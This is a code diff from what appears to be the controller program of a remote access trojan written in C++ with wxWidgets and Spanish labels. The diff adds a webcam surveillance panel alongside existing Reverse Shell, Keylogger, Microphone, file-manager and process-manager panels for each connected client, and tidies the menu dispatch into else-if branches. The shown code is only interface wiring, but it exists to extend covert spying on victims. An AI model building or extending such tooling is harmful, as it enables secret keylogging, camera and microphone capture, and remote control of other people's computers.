@@ -2,6 +2,7 @@
 #include "panel_file_manager.hpp"
 #include "panel_process_manager.hpp"
 #include "panel_keylogger.hpp"
+#include "panel_camara.hpp"
 #include "server.hpp"
 #include "misc.hpp"
 
@@ -67,8 +68,8 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));
 
     this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
-    /*this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
+    /*this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
     
     this->m_tree->AppendItem(rootMisc, wxT("Testing"));*/
     
@@ -144,26 +145,18 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
 
         if (wStr == "Testing") {
             this->p_Notebook->AddPage(new panelTest(this), wStr, true);
-        }
-
-        if (wStr == "Reverse Shell") {
+        } else if (wStr == "Reverse Shell") {
             this->p_Notebook->AddPage(new panelReverseShell(this), wStr, true);
-        }
-
-        if (wStr == "Admin de Archivos") {
+        } else if (wStr == "Admin de Archivos") {
             this->p_Notebook->AddPage(new panelFileManager(this), wStr, true);
-        }
-
-        if (wStr == "Admin de Procesos") {
+        } else if (wStr == "Admin de Procesos") {
             this->p_Notebook->AddPage(new panelProcessManager(this), wStr, true);
-        }
-
-        if (wStr == "Keylogger") {
+        } else if (wStr == "Keylogger") {
             this->p_Notebook->AddPage(new panelKeylogger(this), wStr, true);
-        }
-        
-        if (wStr == "Microfono") {
+        } else if (wStr == "Microfono") {
             this->p_Notebook->AddPage(new panelMicrophone(this), wStr, true);
+        } else if (wStr == "Camara") {
+            this->p_Notebook->AddPage(new panelCamara(this), wStr, true);
         }
 
         this->p_Notebook->Thaw();
